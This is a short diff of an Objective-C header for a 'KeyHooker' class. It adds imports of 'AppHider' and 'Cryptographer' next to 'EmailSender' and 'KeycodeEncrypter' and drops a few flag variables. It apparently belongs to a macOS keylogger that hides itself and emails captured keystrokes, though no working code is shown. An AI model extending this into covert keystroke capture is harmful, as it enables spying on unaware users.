@@ -14,15 +14,13 @@
 #import "EmailSender.h"
 #import "FileManager.h"
 #import "KeycodeEncrypter.h"
+#import "AppHider.h"
+#import "Cryptographer.h"
 
 @interface KeyHooker : NSObject
 
 {
-    BOOL anyKeyPressed;
     BOOL flag;
-    
-    BOOL cmd;
-    
     NSMutableArray *combination;
 }
 
